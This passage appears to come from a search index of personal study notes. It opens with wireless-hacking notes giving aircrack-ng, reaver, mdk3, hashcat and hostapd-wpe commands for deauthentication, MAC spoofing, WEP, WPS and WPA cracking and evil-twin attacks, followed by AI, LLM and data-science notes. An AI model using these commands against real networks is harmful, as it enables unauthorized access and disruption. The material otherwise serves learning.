file.</p>"},{"location":"Cybersecurity/Wireless/Wifi1/","title":"Wifi1","text":"<p>airdump-ng --bssid &lt; &gt; --channels 2 mon0 aireplay-ng --deauth 10000000  -a &lt; bssid&gt; -c &lt; station&gt; -D  mon0                        ( if 5gz -D) if victim is using the internet it means, victim might use another network if it is, then use the same command for the router</p> <p>Hidden Networks airodump-ng --bssid &lt; &gt; --channel &lt; 6&gt; mon0</p> <p>To connect to a network; need to be in managed mode</p>"},{"location":"Cybersecurity/Wireless/Wifi1/#airmon-ng-stop-wlan0mon","title":"&gt; airmon-ng stop wlan0mon","text":""},{"location":"Cybersecurity/Wireless/Wifi1/#iwconfig-mon0-mode-managed","title":"&gt; iwconfig mon0 mode managed","text":""},{"location":"Cybersecurity/Wireless/Wifi1/#service-network-manager-start","title":"&gt; service network manager start","text":"<p>or physically disconnect and start network</p> <p>Mac filtering</p> <p>Mac address is unique to each network device Routers can use mac filtering to allow/deny devices from connecting based on their mac address Implementation Using a balcklist - allow all MAC to connect except the one in the list  Using a whitlist - deny all MAC from connecting except the ones in the list  Changing our MAC address to allowed MAC macchanger -r       (random address) macchanger -m   &lt; specific address&gt; wlan0</p> <p>WEP     - Wired Equivalent privacy     - Old encryption     - Uses an algorithm called RC4     - Still used in some networks     - Can be easily cracked * Client encrypt data using key * Encrypted packet sent in the air * Router decrypt packet using the key * Each packet is encrypted using a key stream  * Random initialization vector (IV) is used to generate the key streams  * The initializing vector is only 24 bits * IV + key  (password) = Key stream * IV is too small (only 24 bits) * IV is sent in plain text Result  * IV's will repeat on busy network * This makes WEP vulnerable to statistical network * Repeated IVs can be used to determine the key stream and break the stream </p> <p>Conclustion     - Capture a large number of packets/IVS         ------&gt;  using airdump-ng      -  Analyse the captured IVs and crack the key   -------&gt; using aircrack-ng</p> <p>Problem      - If network is not busy     - It would take some time to capture enough IVs Solution      - Force the AP to generate new IVs</p> <p>Problem APs only communicate with connected client We cant communicate with it We cant even start the attack Solution  - Associate with the AP before launching the attack</p> <p>airdump-ng --bssid &lt;&gt; --channel &lt;&gt; --write arpreplay mon0 aircrack-ng &lt; basic_web-01.cap&gt;           (key found) aireplay-ng --fakeauth 0 -a &lt;&gt; -h &lt;&gt; mon0      (monitor mode enabled then = unspec 1st 6 digits)</p> <p>ARP Request Replay * Wait for an ARP packet * Capture it, and replay it (transmit it) * This cause the AP to produce another packet with a new IV * Keep doing this till we have enough IVs to crack the key aireplay-ng --arpreplay  -b &lt;&gt; -h &lt;&gt; mon0    aircrack-ng arpreplay-01</p> <p>Packet Injection (Korek chop chop)</p> <p>In this method we will capture an ARP packet and attempt to guess its key stream and use it to forge a new packet(using ) then we can inject this new forged packet into the new traffic  to generate new IVs 1. Capture a packet and determine its key stream</p>"},{"location":"Cybersecurity/Wireless/Wifi1/#aireplay-ng-chopchop-b-target-mac-h-your-mac-mon0","title":"&gt; aireplay-ng --chopchop -b [target mac] -h [your mac] mon0","text":"<ol> <li>Forge a new packet</li> </ol>"},{"location":"Cybersecurity/Wireless/Wifi1/#packetforge-ng-0-a-target-mac-h-your-mac-k-255255255255-l-255255255255-y-out-from-last-stepxor-w-output","title":"&gt; packetforge-ng -0 -a [target mac] -h [your mac] -k 255.255.255.255 -l 255.255.255.255 -y [out from last step.xor] -w [output ]","text":"<ol> <li>Inject the forged packet into the traffic to generate new IV's</li> </ol>"},{"location":"Cybersecurity/Wireless/Wifi1/#aireplay-ng-2-r-out-from-last-step-interface","title":"&gt; aireplay-ng -2 -r [out from last step] [interface ]","text":"<p>aircrack-ng chopchop * We captured the packet -- try to determine key stream -- 86% fake stream -- to air</p> <p>WPS Lock * We exploit WPS by bruteforcing its pin * This means we try every possible pin * Some routers lock after a number of failed attempts Problem      - Locked routers refuse all pins even if we send it the right pin Solution      - Try to somehow reset the router or get the user to reset their router</p>"},{"location":"Cybersecurity/Wireless/Wifi1/#reaver-bssid-channel-mon0-a","title":"&gt; reaver --bssid &lt;&gt; --channel &lt;&gt; mon0 -A","text":""},{"location":"Cybersecurity/Wireless/Wifi1/#reaver-bssid-channel-mon0-a-vvv","title":"&gt; reaver --bssid &lt;&gt; --channel &lt;&gt; mon0 -A -vvv","text":""},{"location":"Cybersecurity/Wireless/Wifi1/#reaver-bssid-channel-i-mon0","title":"&gt; reaver --bssid &lt;&gt; --channel &lt;&gt; -i  mon0","text":""},{"location":"Cybersecurity/Wireless/Wifi1/#wash-i-mon0","title":"&gt; wash -i mon0","text":""},{"location":"Cybersecurity/Wireless/Wifi1/#rourter-stopped-keep-deuthenticating-the-other-users-then-someone-will-turn-off-and-turn-on","title":"Rourter stopped, keep deuthenticating the other users, then someone will turn off and turn on","text":"<p>MD3 is a tool designed to exploit a number of weakness in 802.11 protocol Some of its exploits can cause the router to reset Some routers unlock their WPS when they reset mdk3 mon0 a -a &lt; mac&gt; -m </p> <p>WPA /WPA2 Cracking Fixed all weakness in WEP Packets contains no useful data  Only packets that can aid with the cracking process are the handshake packets These are 4 packets sent when a client connects to the network</p> <p>WPA / WPA2 Cracking</p> <ul> <li>The handshake does not contain data the helps recover the key</li> <li>It contains data that can be used to check if a key is valid or not</li> </ul>"},{"location":"Cybersecurity/Wireless/Wifi1/#aircrack-ng-wpa_handshake-01cap-w-testtxt","title":"aircrack-ng wpa_handshake-01.cap -w test.txt","text":"<p>Pause &amp; Resume cracking</p> <p>Problem:     - Large wordlist can take a long time     - Aircrack-ng starts doesn't save cracking progress Solution      - Use a program that can store proress to read the wordlist     - Pipe its output to aircrack-ng</p> <p>john  --wordlist=wpa-wordlist --stdout john  --wordlist=wpa-wordlist  --stdout --session=upc | aircrack-ng -w - -b &lt; mac&gt; &lt; ex: handshake-01.cap&gt;   (-  get the wordlist from previous command) john  --restore=upc | aircrack-ng -w - -b &lt; mac&gt; &lt; ex: handshake-01.cap&gt;   (-  get the wordlist from previous command) crunch 8 8 | aircrack-ng -b &lt; mac&gt; -w - &lt; handshake-01.cap&gt;</p> <p>Piping wordlist to aircrack with pause &amp; resume support</p> <ul> <li>Large wordlist can take a lot of space</li> <li>Ideally we want to be able to:<ol> <li>Use large wordlists without taking up disk space</li> <li>Stop cracking and resume without loosing progress</li> </ol> </li> </ul> <p>crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b &lt; mac address&gt; -w - &lt; handshake-01.cap&gt; crunch 8 8 | john --stdin --restore=session1 | aircrack-ng -b &lt; mac address&gt; -w - &lt; handshake-01.cap&gt;</p> <p>Cracking WPA/WPA2  : Cracking the key</p> <p>We are going to use aircrack-ng to crack the key. It does this by combining each password in the wordlist with AP name(essid) to compute a pairwise master key (PMK) using the pbkdf2 algoithm, the PMK is the compared to the handshake file.</p>"},{"location":"Cybersecurity/Wireless/Wifi1/#aircrack-ng-handshake-w-wordlist-interface","title":"&gt; aircrack-ng [HANDSHAKE ]  -w [wordlist] [interface]","text":"<p>Computing the PMK is slow, and we only need the wordlist and the essid of the target AP to compute it. Therefore we can save time and compute the PMK for our wordlist while waiting for the handshake 1. Create a database and import wordlist airlob-ng test.db --import paswd wpa-wordlist 2. Import target ESSID  airolib-ng [db_name ] --import essid [essid file ]</p> <p>echo \"test.ap\" &gt; test-essid cat test-essid airolib-ng [db_name ] --import essid [essid file ]</p> <ol> <li>Compute PMK for the wordlist  airolib-ng [db_name ] --batch</li> <li>Crack the key using the PMK database aircrack-ng -r [db_name ] [handshake_file ]</li> </ol> <p>Cracking WPA/WPA2 using GPU</p> <p>GPU is designed to carry out repetitve tasks fast It is more efficient than the CPU at that Cracking hashes is a repetitive task ---&gt; GPU can be used to crack WPA/WPA2 faster hashcat64.exe -m 2500 -d 1 handshake.hccapx &lt; file name&gt;</p> <p>WPA Enterprise</p> <p>All WPA/WPA2 networks we seen so far use PSK authentication A shared key is used to authenticate users One key per network Router manages authentication WPA Enterprise is another form of authentication Each user get their own key to connect to the network Authentication is managed through a central sever (RADIUS SERVER) </p> <p>apt-get install hostpad-wpe leafpad /etc/hostpad-wpe/hostpad-wpe.conf service manager stop hostapd-wpe [ location of the configuration file ] Your password is never saved on the sever asleap -C [ chanllenge] -R [ mac] -W [ file name ]</p> <ol> <li>Captive Portals Open networks No encryption is used Lot of ways to get in</li> </ol> <p>Solution - Do not use captive portals - Use WPA/WPA2 enterprise instead 2. WEP Lot of methods to crack it Even SKA networks can be cracked Solution - Do not use WEP</p> <ol> <li> <p>WPS WPS pin is only 8 digits Can be brute-force even if the router locks Then it can be used to get the WPA/WPA2 key Solution Disable WPS</p> </li> <li> <p>Advanced worklist attacks Work against all networks Passwords can be cracked as long as its in the wordlist Solution Use long complex password of letters, numbers and symbols</p> </li> <li> <p>Evil Twin attacks Exploit the users Work against all networks</p> </li> </ol> <p>Solution -   Educate the users -- Always connect to the right AP -- Never enter password in a web interface</p> <p>wash i mon0 rever --bssid [  ] --channel [ ] -i mon0 -A -vvv             (-A not to associate with reaver, vvv- verbose output) manually associate; do not associate if router closed, deauthenticate to other users, some onewill push button some routers will reset, if lot of mac coming, then Open mode</p>"},{"location":"Data%20Science/AI/","title":"AI","text":"<p>What is Artificial Intelligence? The science of making machines that can think and act like a humans.</p> <p>Sub Fields of Artificial Intelligence * Knowledge Representation * Knowledge Reasoning * Language Understanding * Machine Learning</p> <p>1940-1950: Early days 1943: McCulloch &amp; Pitts: Boolean circuit model of brain o1950: Turing's \u201cComputing Machinery and Intelligence\u201d 1950\u201470: Excitement: Look, Ma, no hands! 1950s: Early AI programs, including Samuel's checkers program, Newell &amp; Simon's Logic Theorist, Gelernter's Geometry Engine 1956: Dartmouth meeting: \u201cArtificial Intelligence\u201d adopted o1965: Robinson's complete algorithm for logical reasoning 1970\u201490: Knowledge-based approaches 1969\u201479: Early development of knowledge-based systems o1980\u201488: Expert systems industry booms 1988\u201493: Expert systems industry busts: \u201cAI Winter\u201d 1990\u2014: Statistical approaches</p> <p>Resurgence of probability, focus on uncertainty oGeneral increase in technical depth Agents and learning systems\u2026 \u201cAI Spring\u201d?</p> <p>What is an Agent? An agent is anything that can be viewed as perceiving its environment through sensor and acting upon that environment through actuators.</p> <p>What is a Rational Agent? A rational agent is one that acts so as to achieve the best outcome or, when there is uncertainty, the best expected outcome.</p> <p>Designing Rational Agents In designing an agent,  the first step  must always be to specify the task environment as fully as possible.</p> <p>We need PEAS (Performance, Environment, Actuators, Sensors) description.</p> <p>Properties of task environment * Fully Observable vs Partially Observable * Deterministic vs Stochastic * Static vs Dynamic * Discrete vs Continuous * Benign vs Adversarial * Episodic vs Sequential * Single agent vs Multiagent</p> <p>Fully Observable Environments - If an agent\u2019s sensors give it access to the complete state of the environment at each point in time, then we say that the task environment is fully observable.</p> <p>Partially Observable Environments - An environment might be partially observable because of noisy and inaccurate sensors or because parts of the state are simply. In those environments you need memory on the side of the agent to make the best possible decision.</p> <p>Deterministic Environments - If the next state of the environment is completely determined by the current state and the action executed by the agent.</p> <p>Stochastic Environments - If the next state of the environment is not determined by the current state and the action executed by the agent. There is certain amount of uncertainty involves the next state.</p> <p>Static  Environments - If the environment does not change while an agent is deliberating, then we say  the environment is static.</p> <p>Dynamic Environments - If the environment can change while an  agent is deliberating, then we say the environment is dynamic.</p> <p>Discrete Environments - Discrete environment is one where you have finitely many choices.</p> <p>Continuous Environments - Possible actions or things you could sense may be infinite.</p> <p>Benign  Environments - The environment has no objective that would \u201cgo against\u201d what you're trying to accomplish.</p> <p>Adversarial Environments - The environment observes you and contradict what you're trying to achieve.</p> <p>Episodic Environments - In an episodic task environment, the agent\u2019s experience is divided into atomic episodes. In each episode the agent receives a percept and then performs a single action. - Crucially, the next episode does not depend on the actions taken in previous episodes.</p> <p>Sequential Environments - In sequential environments, on the other hand,  the current decision could affect all future decisions.</p> <p>Single agent environments - If only one agent is involved in an environment, and operating  by itself then such an environment is called single agent environment.</p> <p>Multiagent Environments - If multiple agents are operating in an environment, then such an environment is called  a multi-agent environment.</p> <p>Structure of the Rational Agent</p> <p>Agent = Architecture + program Architecture is the machinery that the agent executes on. It is a device with sensors and actuators, for example : a robotic car, a camera, a PC. Agent program is an implementation of an agent function. An agent function is a map from the percept sequence to an action</p> <p>Types of Rational Agents * Simple Reflex Agents * Model Based Reflex Agents * Goal Based Agents * Utility Based Agents * Learning Agents</p> <p>Simple Reflex Agents</p> <ul> <li>The simplest kind of agent is the simple reflex agent.</li> <li>Acts only on the basis of current perception</li> <li>Ignore  the rest of the percept history</li> <li>Based on the Condition Action Rule</li> </ul> <p>Simple  Reflex  Agents: Examples Tic-Tac-Toe</p> <p>1940-1950: Early days 1943: McCulloch &amp; Pitts: Boolean circuit model of brain o1950: Turing's \u201cComputing Machinery and Intelligence\u201d 1950\u201470: Excitement: Look, Ma, no hands! 1950s: Early AI programs, including Samuel's checkers program, Newell &amp; Simon's Logic Theorist, Gelernter's Geometry Engine 1940-1950: Early days 1943: McCulloch &amp; Pitts: Boolean circuit model of brain o1950: Turing's \u201cComputing Machinery and Intelligence\u201d 1950\u201470: Excitement: Look, Ma, no hands! 1950s: Early AI programs, including Samuel's checkers program, Newell &amp; Simon's Logic Theorist, Gelernter's Geometry Engine 1956: Dartmouth meeting: \u201cArtificial Intelligence\u201d adopted o1965: Robinson's complete algorithm for logical reasoning 1970\u201490: Knowledge-based approaches 1969\u201479: Early development of knowledge-based systems o1980\u201488: Expert systems industry booms 1988\u201493: Expert systems industry busts: \u201cAI Winter\u201d 1990\u2014: Statistical approaches Resurgence of probability, focus on uncertainty oGeneral increase in technical depth Agents and learning systems\u2026 \u201cAI Spring\u201d? 1956: Dartmouth meeting: \u201cArtificial Intelligence\u201d adopted o1965: Robinson's complete algorithm for logical reasoning 1970\u201490: Knowledge-based approaches 1969\u201479: Early development of knowledge-based systems o1980\u201488: Expert systems industry booms 1988\u201493: Expert systems industry busts: \u201cAI Winter\u201d 1990\u2014: Statistical approaches</p> <p>Resurgence of probability, focus on uncertainty oGeneral increase in technical depth Agents and learning systems\u2026 \u201cAI Spring\u201d? Checkers Game Vacuum Cleaner</p> <p>Model Based Reflex Agents * Maintain an internal state which is adjusted by each percept * Can be used to handle partial observability by use of a model about the world * Rule  for action depends on both state and percept Model Based Reflex Agents: Examples House Cleaning  Robot Mars Lander</p> <p>Model Based Reflex Agents Pros: Can work on Partially observable environments Cons: Impossible to model the world accurately and reliably</p> <p>Goal Based Agents * Expansion of Model Based Reflex agents. * Decision based on how far they are currently from their goal(description of desirable situations). * Actions are intended to reduce its distance from the goal. * Agent will account for the future</p> <p>Goal Based Agents: Examples Delivery Agents Route Finding</p> <p>Goal Based Agents Pros: Flexible Cons: Need searching and planning</p> <p>Utility Based Agents</p> <ul> <li>Sometimes achieving the desired goal is not enough.</li> <li>Agent happiness should be taken into consideration.</li> <li>Utility describes how \u201chappy\u201d the agent is.</li> <li>A utility function maps a state onto a real number which describes the associated degree of happiness.</li> </ul> <p>Utility Based Agents: Examples * Delivery Agents * Route Finding</p> <p>Utility Based Agents Pros: Works on conflicting goals or uncertain goals Cons: Utility function</p> <p>Learning Agents Let the agent figure things out by itself! Learning element Makes improvements to performance element Performance element Selects actions Previously this was the whole agent Critic Gives performance feedback to learning element Needed because precepts don\u2019t capture performance Problem generator Suggests innovative actions</p> <p>Problem Solving: \u2022 Four general steps in problem solving: \u2022 Goal Formulation: \u2022 What are the successful world states \u2022 Problem Formulation: \u2022 What actions and states to consider given the goal \u2022 Search: \u2022 Examine different possible sequences of actions that lead to states of known value and then choose the best sequence \u2022 Execute: \u2022 Perform the actions on the basis of the solution \u2022 Problem-solving agent: a type of goal-based agent \u2022 Decide what to do by finding sequences of actions that lead to desirable states</p> <p>Properties of a Search Algorithm \u2022 Completeness: Is the algorithm guaranteed to find a solution when there is one? \u2022 Optimality: Does the strategy find the optimal solution? \u2022 Time complexity: How long does it take to find a solution? (with respect to number of inputs) \u2022 Space complexity: How much memory is needed to perform the search? (with respect to number of inputs)</p> <p>Types of Search \u2022 Uninformed Search (Blind Search) \u2022 Informed Search (Heuristic Search)</p> <p>Types of Uninformed Search \u2022 Breadth-first Search \u2022 Depth-first Search \u2022 Uniform Cost Search \u2022 Depth-limited search \u2022 Iterative deepening depth-first search</p> <p>Breadth-first Search</p> <p>\u2022 Breadth-first search is a simple strategy in which the root node is expanded first, then all the successors of the root node are expanded next, then their successors, and so on</p> <p>Pros: \u2022 Guarantee to find a solution \u2022 Find a solution with minimal steps  Cons: \u2022 Need lot of memory \u2022 Time Consuming</p> <p>Depth-first Search \u2022 Depth-first search always expands the deepest node in the current frontier of the search tree.</p> <p>Pros: \u2022 Memory efficient \u2022 Less time  Cons: \u2022 Not guaranteed to find a solution</p> <p>Uniform cost Search \u2022 Expands the node with the lowest path cost Pros: \u2022 Complete \u2022 Optimal \u2022 Cons: \u2022 Explore options in every direction</p> <p>Depth Limited Search \u2022 It is similar to DFS with a predetermined limit. \u2022 Node at the depth limit will treat as it has no successor nodes further Pros: \u2022 Memory Efficient \u2022 Does not run in to infinite loops \u2022 Cons: \u2022 Incompleteness \u2022 Not Optimal</p> <p>Iterative Deepening depth-first Search \u2022 It is a combination of Depth First Search (DFS) and Breadth First Search (BFS).</p> <p>Pros: \u2022 Faster than BFS \u2022 Not going to infinite loops \u2022 Cons: \u2022 Repeat all the work in the previous phase</p> <p>What is Informed (Heuristic) Search? \u2022 Informed (Heuristic) search strategies use problemspecific knowledge beyond the definition of the problem itself. \u2022 Informed search can find solutions more efficiently than an uninformed strategy. \u2022 It can solve much complex problems which could not be solved in another way.</p> <p>Types of Informed Search</p> <p>\u2022 Best First Search \u2022 A* Search</p> <p>Best First Search (Greedy Search) \u2022 It always selects the path which appears best at the moment. \u2022 It is a combination of Depth First Search (DFS) and Breadth First Search (BFS). \u2022 It uses the heuristic function h(n) &lt;= h(n). \u2022 h(n) = Heuristic Cost \u2022 h(n) = Cost \u2022 If n is a goal node, h(n) =0</p> <p>Best First Search \u2022 Pros: \u2022 Efficient than BFS and DFS \u2022 Cons: \u2022 Might lead to infinite loops \u2022 Not optimal A Search \u2022 A search finds the shortest path using heuristic function (h(n)) and the cost to reach the node n (g(n)). \u2022 It is similar to Uniform Cost Search except that it uses g(n) + h(n) instead of g(n). \u2022 A Score (n) = g (n) + h (n) A Search \u2022 Pros: \u2022 It is optimal and complete \u2022 It can solve very complex problems. \u2022 Cons: \u2022 It does not always produce shortest path \u2022 Not practical for large scale problems</p> <p>Introduction to Planning \u2022 Planning is an important topic in AI. \u2022 Planning is required for every task. \u2022 Example: Reaching a particular destination requires planning.</p> <p>What is Planning? \u2022 Planning is the process of computing several steps of a problem-solving procedure before executing any of them. \u2022 Find sequence of actions that achieves a given goal when executed from a given initial world state.</p> <p>Problems with Standard Search \u2022 Overwhelmed by irrelevant actions \u2022 Finding a good heuristic function is difficult \u2022 Cannot take advantage of problem decomposition</p> <p>Planning vs. Problem Solving</p> <p>\u2022 Planning agent is different from problem solving agent in: \u2022 Representation of goals, states, actions \u2022 Use of explicit, logical representations \u2022 Way it searches for solutions \u2022 Planning is more powerful because of the representation and methods used</p> <p>Defining a Planning System: \u2022 It requires; \u2022 domain description, \u2022 action specification, \u2022 goal description.</p> <p>Two Types of Planning 1. Classical Planning: \u2022 Fully Observable \u2022 Deterministic \u2022 Static 2. Non- Classical Planning: \u2022 Partially Observable \u2022 Stochastic</p> <p>Planning Algorithms: 1.Forward State Space Planning (FSSP) \u2022 Progression 2. Backward State Space Planning (BSSP) \u2022 Regression</p> <p>Progression \u2022 A plan is a sequence of STRIPS operators \u2022 From initial state, search forward by selecting operators whose preconditions can be unified with literals in the state \u2022 New state includes positive literals of effect; the negated literals of effect are deleted \u2022 Search forward until goal unifies with resulting state \u2022 This is state-space search using STRIPS operators Regression \u2022 A plan is a sequence of STRIPS operators \u2022 The goal state must unify with at least one of the positive literals in the operator\u2019s effect \u2022 Its preconditions must hold in the previous situation, and these become subgoals which might be satisfied by the initial conditions \u2022 Perform backward chaining from goal \u2022 Again, this is just state-space search using STRIPS operators</p> <p>Partial Order Planning \u2022 Idea: \u2022 works on several subgoals independently \u2022 solves them with subplans \u2022 combines the subplans \u2022 flexibility in ordering the subplans \u2022 least commitment strategy: \u2022 delaying a choice during search \u2022 Example, leave actions unordered, unless they must be sequential</p> <p>Central component of a knowledge-based agent is a Knowledge-Base</p> <p>Properties of FOL</p> <p>1.Validity: A formula is valid if it holds true for all possible interpretations. For instance, the formula P \u2228 \u00acP (where P is a proposition) is always true, regardless of the truth value of P. It is known as the principle of the excluded middle.</p> <p>2.Satisfiability: A formula is satisfiable if it can be made true by some interpretation. For example, the formula P \u2227 Q is satisfiable when both P and Q are true.</p> <p>3.Unsatisfiability: A formula is unsatisfiable if it cannot be made true by any interpretation. For instance, the formula P \u2227 \u00acP (where P is a proposition) is always false, regardless of the truth value of P . It represents a logical contradiction.</p> <p>4.Entailment: Entailment occurs when one formula logically implies another. For example, if we have the premises \u2200x (P(x) \u2192 Q(x)) and \u2200x P(x) , we can logically infer \u2200x Q(x). This means that the truth of the premises implies the truth of the conclusion.</p>"},{"location":"Data%20Science/AI_Eng/","title":"AI Eng","text":"<p>2 types of language model      - Masked language model     - Auto regressive model</p> <p>Masked Language model </p> <p>is trained to predict missing tokens anywhere in a sequence, using the context from both before and after the missing token. ex : BERT </p> <p>LLM can be trained using self-supervision A model that can work with more than one data modality is also called multi modal model A generative multimodel is also called a large multi model (LMM)</p> <p>AI Engineering refers to process of building applications on top of foundation models</p> <p>Dataset Engineering refers to curating, generating and annotating the data needed for training and adapting AI model</p> <p>2014 seq2seq Have encoder process input and a decoder that generates output Encoder output to final hidden state, then decoder outputting using final hidden state and previous generated output</p> <p>2 problems addresssed in Vasawani et al. (2017) vanila seq2seq decoder output tokens using only final hidden state of the input RNN encoder and decoder means both input and output is done sequentially making it slow for long sequence</p> <p>Attention mechanism is introduced three years before transformer architecture Attention mechanism can be used with other other architectures 2016 Google seq2seq with attention mechanism GNMT </p> <p>With transfomers the input tokens are processed in parallel. speeding up input processing Still output processing is slow</p> <p>Inference for transformer based language models cosnsist 2 steps     - Prefil     - Decode </p> <p>Attention mechanism      - Query vector = current stage of decoder at each decoding step     - Key vector = previous token      - Value vector = actual value of a previous token</p> <p>Each previous token has key and value vector. The longer the sequence, more key and value need to computed and stored. This makes hard to increase context length of the transformer model </p> <p>Attention mechanism always almost multi headed Multiple heads allow the model to attend to different groups of previous tokens simulataneously All output of attention heads are concatenated, output projection matrix used applying another transformation before fedding into next computation</p> <p>Tranformer archiecture     consist of multiple transformer model     the exact content of block varies between different models     In general it has,              Attention module = [query, key, value, output projection ]                MLP = each linear layer is separated by non linear activation function                         (Where an activation function allows the linear layers to learn non linear pattern)</p> <p>Linear layer = feedforward layer No of transfomer blocks in a transfomer model is reffered to as that model's number of layers. </p> <p>AlexNet - 2012 GAN      - (2014 -  2019)</p> <p>1 popular model is RKWV  It does not have the same context length limitation like transformer model. however no context length limitation doesnt guarantee good performance with long context</p> <p>if a model has 7 billion parameters and each parameter using 2 bytes = 14 billion bytes GPU  No of parameters may be misleading if the model is sparse. A sparse model large percentage of zero value parameters 7B model 90% sparse means only only 700million non zero paramters Sparcity allows for more efficient data storage and computation. Large sparse model can require less compute than a small dense model</p> <p>A type of sparse model that MoE (Mixture of experts) An MoE is divided into groups of paramters each group is an expert. Only subset of the experts is active for process token Ex : Mistral 8x7B is a mixture of 8 experts. each expert with 7B paramters, 8 x 7 = 56 due to parameter sharing only 46.7B</p> <p>FLOPS - Floating point of operation Hyperparameter transfering</p> <p>Eventually LLM will use all internet data This is like if post something will be indexed by google</p> <p>Every model post training is different     - Supervised finetunning (SFT)     - Preference finetunning = typically done using reinforcement learning</p> <p>Pre training - to acquire knowledge  Post training - learning how to use that knowledge </p> <p>Pre trained model is optimized for completition rather than conversing  Companies use highly educated labelers to generate demonstration data </p> <p>RLHF consist of 2 parts  - Train a reward model that scores the foundation model output - Optimize the foundation model to generate responses for which the reward model will give maximal scores</p> <p>RLHF used today, DPO are getting popular Evaluating each sample independently is <code>pointwise evaliation</code></p> <p>A model construct its output through a process known as sampling</p> <p>Always picking the most likely outcome is called greedy sampling However for large language model, greedy sampling creates boring output Higher temperature reduces common token, increases rarer token making creative response</p> <p>Neural network's probabilities because it helps reduce the underflow problem Small numbers rounded to 0, log scale helps reduce the problem</p> <p>Top -k is a sampling strategy to reduce the computation workload without sacrificing too much the model's response diversity. Softmax need 2 passes over all possible values.      One to perform the exponential sum     One to perform for each value     - for LLM with large vocab this is expensive</p> <p>Top P also nucleus sampling model sums the probabilities of the most likely next value in descending order and stop when the sum reach p Only values within cumulative probability are considered.</p> <p>Related sampling strategy is min-p, set minimum probability token must reach to be considered during sampling</p> <p>Generating 2 output is expensive OpenAI (2021) found that sampling more outputs led to better performance, but only up to 400 outputs.</p> <p>A model is considered robust when the input is slightly change but does not affect the output A model tends to repeat same mistakes across queries</p> <p>Constraint sampling     is a technique for guiding the generation of text toward certain constraints</p> <p>Snowballing hallucination - after making an incorrect assumption a model can continue hallucinating to justify the initial wrong assumption (Zhang et al 2023)</p> <p>Incorrect assumption make mistakes by model otherwise model knows the true answer</p> <p>Evaluating LLM model is harder compared to traditional ML system ex : First grade student math and Ph.D level student</p> <p>Language modelling metrics      - Cross entropy     - Perplexity     - BPC     - BCP</p> <p>Entropy measures how much information, on average a token carries. The higher the entropy the more information each token carries out </p> <p>A language model's cross entropy means how difficult it is for the language model to predict what comes next in the dataset</p> <p>Fundamental correctness evaluation means evaluating a system based on whether it performs the intended functionality But not straightforward to measure and cannot be automated</p> <p>Lexical similarity measures how much two texts overlap 1. counting how many token two text have in common 2. n-gram similarity ... BLEU, ROUGE, METEOR++, TER, CIDEr</p> <p>Teaching models what to do via prompts is in context learning</p> <p>Vector Search algorithms - LSH (locality sensitive hashing) - HNSW (Hierarchical Navigable small world) - Product qunatization  - IVF (Inverted file index) - Annoy (Approximate Nearest Neighbors Oh yeah)</p> <p>Other algorithms      - Microsoft SPTAG (Space Parition Tree And Graph)     - FLANN  (Fast Library for Approximate Nearest Neigbors)</p> <p>Any database that can store vectors can be called vector database Term base retriveal is generally much faster than embedding-based retriveal during both indexing and query</p> <p>Context precision - out of all the documents retrieved, what percentage is relavent to the query Context recall - out of all documents that are relavent to the query, what percentage is retrived</p> <p>Context precision is also called context relevance</p> <p>Query rewriting is also query reformulation, query normalization, query expansion Long-term memory can be used to store the overflow from short-term memory. Finetuning is the process of adapting a model to a specific task by further training the whole model or part of the model</p> <p>Finetuning bias mitigation If a model constantly assign male CEO can be added with female CEO Distills larger model knowledge into smaller model is called distillation ex : Flan-T5 model outperform GPT 3 in various text editing task despite it being 60 times smaller</p> <p>Possible to fine tune larger model but fine tunning smaller model is more common</p> <p>Fine tunning is a one way to transfer learning - concept in 1976 by Bozinovski and Fulgosi Google multi lingual translation system : Portugeese-English , English-Spanish to directly to Spanish-Portugees</p> <p>Like for transfer learning can use finetunning, also feature base learning  Common in computer vision ex: 2010 Imagenet dataset to extract features used for such as object detection, image segmentation</p> <p>Self supervised finetuning is also called continued pre-training Possible to extend model context length. Long context finetunning typically requires modifying the model architecture</p> <p>Parameters that are kept unchange is called frozen parameters During inferencing only forward pass How much each parameter should be readjusted given its gradient value decide by optimizer</p> <p>Training memory = model weights + activation + gradient + optimizer states Gradient checkpoining, activation recomputation - instead of storing activation for reuse, recompute activations when necessary</p>"},{"location":"Data%20Science/DL/","title":"DL","text":"<p>The perceptron is one of the simplest ANN architecture.</p> <p>Slightly different TLU, LTU </p> <p>Vanisihing Gradient problem</p> <p>Batch Normalization</p> <p>Gradient clipping</p> <p>Optimization </p> <p>Avoiding overfitting through regularization</p> <p>L1</p> <p>L2</p> <p>Dropout</p> <p>Monte Carlo Dropout</p> <p>Max-norm regularization</p> <p>Prefetching</p> <p>Alex Net GoogleNet VGGNet ResNet Xception SENet</p> <p>Fully convolutional Network</p> <p>Semantic Segmentation</p>"},{"location":"Data%20Science/Data%20Engineering/","title":"Data Engineering","text":"<p>Data Modelling The process of creating a visual representation of data elements and their relationships within a system.</p> <p>Key Concepts in Data Modelling</p> <p>Conceptual modelling Focuses on understanding business entities, their attributes, and relationships. Independent of any specific database technology.</p> <p>Logical modelling Translates conceptual model into a more detailed model aligned with a specific database technology (e.g., relational, hierarchical, object-oriented).</p> <p>Physical modelling Maps logical model to the physical storage structure of the chosen database system. Optimizes for performance, scalability, and security.</p> <p>Principal Component Analysis (PCA): Reduce dimensionality while preserving most of the variance in the data. Linear Discriminant Analysis (LDA): Reduce dimensionality while maximizing class separability.</p>"},{"location":"Data%20Science/DataPreprocess/","title":"DataPreprocess","text":"<p>Properties of Data \u2022 Volume: Scale of Data. \u2022 Variety: Different forms of data. \u2022 Velocity: Rate of data streaming and generation. \u2022 Value: Meaningfulness of data in terms of information. \u2022 Veracity: Certainty and correctness in data.</p> <p>Data Preprocessing It is a process that involves transforming raw data into an understandable format. \u2022 Data cleaning \u2022 Data integration \u2022 Data transformation \u2022 Data reduction Why pre-process the data? \u2022 Data in the real world is: \u2022 incomplete: lacking values, certain attributes of interest, etc. \u2022 noisy: containing errors or outliers \u2022 inconsistent: lack of compatibility or similarity between two or more facts</p> <p>Data Cleaning \u2022 Process of fixing or removing: \u2022 Incorrect \u2022 Corrupted \u2022 Incorrectly formatted \u2022 Duplicate \u2022 Incomplete data within a dataset \u2022 If data is incorrect, outcomes and algorithms are unreliable. \u2022 There is no one absolute way to prescribe the exact steps in the data cleaning process.</p> <p>Step 1: Removing Duplicate or Irrelevant Observations \u2022 Duplicate observations will happen most often during data collection. \u2022 De-duplication is one of the largest areas to be considered in this process. \u2022 Irrelevant observations are when you notice observations that do not fit into the specific problem. \u2022 Creating a more manageable and more performant dataset</p> <p>Step 2: Fixing Structural Errors \u2022 